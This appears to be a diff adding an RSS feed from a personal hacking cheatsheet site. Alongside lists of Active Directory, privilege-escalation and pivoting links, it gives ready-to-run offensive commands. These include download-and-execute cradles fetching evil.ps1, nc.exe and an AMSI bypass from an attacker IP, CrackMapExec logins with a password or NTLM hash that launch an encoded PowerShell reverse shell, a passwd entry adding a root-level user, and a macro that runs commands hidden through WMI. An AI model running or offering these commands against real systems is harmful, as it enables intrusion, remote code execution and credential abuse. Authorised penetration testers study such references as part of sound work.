+&lt;li&gt;&lt;a href="https://3xpl01tc0d3r.blogspot.com/2021/07/resource-based-constrained-delegation.html?m=1"&gt;https://3xpl01tc0d3r.blogspot.com/2021/07/resource-based-constrained-delegation.html?m=1&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;ndash; Resource Based Constrained Delegation IN LINUX&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/"&gt;https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki"&gt;https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks"&gt;https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.ired.team/"&gt;https://www.ired.team/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.harmj0y.net/blog/"&gt;https://www.harmj0y.net/blog/&lt;/a&gt; **&amp;lt;&amp;mdash;&amp;mdash; Awesome Active Directory Posts **&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://malicious.link/post/2016/kerberoast-pt1/"&gt;https://malicious.link/post/2016/kerberoast-pt1/&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; Serie about Kerberoasting (5 posts)&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet"&gt;https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/"&gt;https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;ndash; Abuse Constrained Delegation&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://twitter.com/cube0x0/status/1468860246307258370?s=21"&gt;https://twitter.com/cube0x0/status/1468860246307258370?s=21&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet"&gt;https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>HTTP</title><link>https://ceso.github.io/cheatsheets/hacking/exfiltration/http/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/exfiltration/http/</guid><description>&lt;p&gt;From your local attacker machine, create a http server with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo python3 -m http.server 80
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo python2 -m SimpleHTTPServer 80
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s also possible to specify which path to share, for example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo python3 -m http.server 80 --dir /home/kali/tools
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="windows"&gt;Windows&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;iex(new-object net.webclient).downloadstring(&amp;#34;http://192.168.42.42/evil.ps1)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;IWR -Uri &amp;#34;http://192.168.42.42/n64.exe&amp;#34; -Outfile &amp;#34;n64.exe&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certutil.exe -urlcache -split -f &amp;#34;http://192.168.42.42/nc.exe&amp;#34; nc.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wmic process get brief /format:&amp;#34;http://192.168.42.42/evilexcel.xsl
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;bitsadmin /Transfer myDownload http://192.168.42.42/evilfile.txt C:\Windows\Temp\evilfile.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="linux"&gt;Linux&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://192.168.42.42/evil.php --output evil.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Linux</title><link>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/</guid><description>&lt;h1 id="homeuseropenssl-ep-empty-capabilities"&gt;/home/user/openssl =ep (empty capabilities)&lt;/h1&gt;
+&lt;p&gt;Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cp /etc/passwd /tmp/passwd.orig
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cp /etc/passwd /tmp/passwd.custom
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, a custom user will be created and added to &lt;code&gt;/tmp/passwd.custom&lt;/code&gt; with &lt;code&gt;customPassword&lt;/code&gt; and as root user (UID = GID = 0):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &amp;#39;ceso:&amp;#39;&amp;#34;$( openssl passwd -6 -salt xyz customPassword )&amp;#34;&amp;#39;:0:0::/tmp:/bin/bash&amp;#39; &amp;gt;&amp;gt; /tmp/passwd.custom
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, create a custom &lt;code&gt;key.pem&lt;/code&gt; and &lt;code&gt;cert.pem&lt;/code&gt; with openssl:&lt;/p&gt;</description></item><item><title>Linux</title><link>https://ceso.github.io/resources/books/linux/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/books/linux/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/"&gt;https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Linux</title><link>https://ceso.github.io/resources/operating_systems/linux/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/operating_systems/linux/</guid><description>&lt;h1 id="general"&gt;General&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.pathname.com/fhs/pub/fhs-2.3.html"&gt;http://www.pathname.com/fhs/pub/fhs-2.3.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.linusakesson.net/programming/tty/"&gt;http://www.linusakesson.net/programming/tty/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;http://pentestmonkey.net/blog/post-exploitation-without-a-tty&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="privilege-escalation"&gt;Privilege Escalation&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://gtfobins.github.io/"&gt;https://gtfobins.github.io/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation"&gt;https://book.hacktricks.xyz/linux-unix/privilege-escalation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://guif.re/linuxeop"&gt;https://guif.re/linuxeop&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html"&gt;https://www.win.tue.nl/~aeb/linux/hh/hh-8.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.dankalia.com/tutor/01005/0100501004.htm"&gt;http://www.dankalia.com/tutor/01005/0100501004.htm&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.ikuamike.io/posts/2021/package_managers_privesc/"&gt;https://blog.ikuamike.io/posts/2021/package_managers_privesc/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Login through CIFS/WinRM/PSSession</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/</guid><description>&lt;p&gt;When injecting a ticket and impersonating a user, we can swap &lt;code&gt;CIFS&lt;/code&gt; for &lt;code&gt;HTTP&lt;/code&gt; for getting a shell via WinRM or swap &lt;code&gt;CIFS&lt;/code&gt; for &lt;code&gt;HOST&lt;/code&gt; for getting a shell via PsExec!!!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id="crackmapexec---winrm"&gt;CrackMapExec - WinRM&lt;/h1&gt;
+&lt;p&gt;With Hash&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crackmapexec winrm 172.16.80.24 -u administrator -H 09238831b1af5edab93c773f56409d96 -x &amp;#34;ipconfig&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With Password (Example gets a reverse shell)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crackmapexec winrm 172.16.80.24 -u brie -p fn89hudi1892r -x &amp;#34;powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgAxADAANwAvAG4AaQBlAHIAaQAuAHAAcwAxACIAKQA7AEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAwADcALwByAHUAbgAtAHMAaABlAGwAbABjAG8AZABlAC0ANgA0AGIAaQB0AHMALgBwAHMAMQAiACkACgA=&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="crackmapexec---smb"&gt;CrackMapExec - SMB&lt;/h1&gt;
+&lt;p&gt;With Hash&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crackmapexec smb 172.16.21.22 -u gouda -H 09238831b1af5edab93c773f56409d96 -x &amp;#34;powershell.exe IEX(New-Object Net.Webclient).downloadString(&amp;#39;http://192.168.42.42/4msibyp455.ps1&amp;#39;);IEX(New-Object Net.Webclient).downloadString(&amp;#39;http://192.168.42.42/dameelreversooo.ps1&amp;#39;)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With Hash + Domain&lt;/p&gt;</description></item><item><title>Metasploit</title><link>https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/</guid><description>&lt;p&gt;We use metasploit: autorute + socks_proxy&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-background" data-lang="background"&gt;use post/multi/manage/autoroute
+set session 8
+run
+use auxiliary/server/socks_proxy
+run -j
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The SRVPORT of socks_proxy must match the one configured in proxychains.conf as the VERSION used as well.&lt;/p&gt;
+&lt;hr&gt;</description></item><item><title>Misc</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/</guid><description>&lt;h1 id="enable-execution-of-powershell-scripts"&gt;Enable execution of PowerShell Scripts&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Set-ExecutionPolicy RemoteSigned
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Set-ExecutionPolicy Unrestricted
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;powershell.exe -exec bypass
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="encode-powershell-b64-from-linux"&gt;Encode Powershell b64 from Linux&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &amp;#39;ImAnEviCradleBuuhhhh&amp;#39; | iconv -t UTF-16LE | base64 -w0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="encodedecode-b64-in-windows-without-powershell"&gt;Encode/Decode b64 in Windows WITHOUT Powershell&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certutil -encode &amp;lt;inputfile&amp;gt; &amp;lt;outputfile&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certutil -decode &amp;lt;b64inputfile&amp;gt; &amp;lt;plainoutputdecodedfile&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- If the file exists I can use the -f flag which will force an overwrite
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="set-proxy-in-code-used-windows"&gt;Set Proxy in code used (Windows)&lt;/h1&gt;
+&lt;h2 id="powershell"&gt;Powershell&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="jscript"&gt;JScript&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;var url = &amp;#34;http://192.168.42.43/reverse.exe&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;var var Object = new ActiveXObject(&amp;#34;MSXML2.ServerXMLHTTP.6.0&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.setProxy(&amp;#34;2&amp;#34;,&amp;#34;192.168.42.42:3128&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.open(&amp;#39;GET&amp;#39;, url, false);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.send();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- This was tricky because lack of debug information. The parameter in &amp;#34;2&amp;#34; means &amp;#34;SXH_PROXY_SET_PROXY&amp;#34;, and it allows to specify a list of one or more servers together with a bypass list. The .open() must be in lowercase otherwise .Open() is another method
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="hide-foreground-with-wmi-windows-office-macros"&gt;Hide Foreground with WMI (Windows, Office Macros)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Sub example()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Const HIDDEN_WINDOW = 0
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Dim cmd As String
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt; cmd = &amp;#34;Here there is some commands to execute inside the macro via WMI&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objWMIService = GetObject(&amp;#34;winmgmts:&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objStartup = objWMIService.Get(&amp;#34;Win32_ProcessStartup&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objConfig = objStartup.SpawnInstance_
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; objConfig.ShowWindow = HIDDEN_WINDOW
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objProcess = GetObject(&amp;#34;winmgmts:Win32_Process&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; errReturn = objProcess.Create(str, Null, objConfig, pid)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;End Sub
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Mobile</title><link>https://ceso.github.io/resources/labs/mobile/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/labs/mobile/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://mas.owasp.org/crackmes/"&gt;https://mas.owasp.org/crackmes/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/oversecured/ovaa"&gt;https://github.com/oversecured/ovaa&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Networking</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/networking/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/networking/</guid><description>&lt;h1 id="nmap"&gt;nmap&lt;/h1&gt;
+&lt;p&gt;I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sV -O --top-ports 50 --open -oA nmap/initial &amp;lt;ip or cidr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sC -sV -O --open -p- -oA nmap/full &amp;lt;ip or cidr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sU -p- -oA nmap/udp &amp;lt;ip or cidr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;--top-ports only scan the N most common ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--open only show open ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-sC use the default scripts
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-sV detect versions
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-O detect Operating Systems
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-p- scan all the ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-oA save the output in normal format, grepable and xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-sU scan UDP ports
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Is also possible to specify scripts or ports:&lt;/p&gt;</description></item><item><title>Obfuscators</title><link>https://ceso.github.io/resources/exploit_development/deobfuscators/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/exploit_development/deobfuscators/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.unphp.net/"&gt;https://www.unphp.net/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://lelinhtinh.github.io/de4js/"&gt;https://lelinhtinh.github.io/de4js/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://jsnice.org/"&gt;http://jsnice.org/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/java-deobfuscator/deobfuscator"&gt;https://github.com/java-deobfuscator/deobfuscator&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Obfuscators</title><link>https://ceso.github.io/resources/exploit_development/obfuscators/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/exploit_development/obfuscators/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/danielbohannon/Invoke-Obfuscation"&gt;https://github.com/danielbohannon/Invoke-Obfuscation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/Bashfuscator/Bashfuscator"&gt;https://github.com/Bashfuscator/Bashfuscator&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Permissions: ACE/SDDL - Format</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/</guid><description>&lt;ul&gt;
+&lt;li&gt;ACE (Access Control Enties)&lt;/li&gt;
+&lt;li&gt;SDDL (Security Descriptor Definition Language)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;--&amp;gt; ace_type: defines allow/deny/audit
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; ace_flags: inheritance objects
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; rights: incremental list with given permissions (allowed/audited/denied), incrmentalas ARE NOT the only ones
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; object_guid and inherit_object: Allows to apply an ACE on a specified objects by GUID values. GUID is an object class, attribute, set or extended right, if pressent limits the ACE&amp;#39;s to the object the GUID represents. Inherited GUID represents an object class, if present will limit the inheritance of ACE&amp;#39;s to the child enties only of that object
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--&amp;gt; account_sid: SID of the object the ACE is applying, is the SID of the user or group to the one permissions are being assigned, sometimes there are acronyms of well known SID&amp;#39;s instead of numerical ones
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Pivoting</title><link>https://ceso.github.io/resources/general_hacking/pivoting/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/general_hacking/pivoting/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://artkond.com/2017/03/23/pivoting-guide/"&gt;https://artkond.com/2017/03/23/pivoting-guide/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/"&gt;https://nullsweep.com/pivot-cheatsheet-for-pentesters/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html"&gt;https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
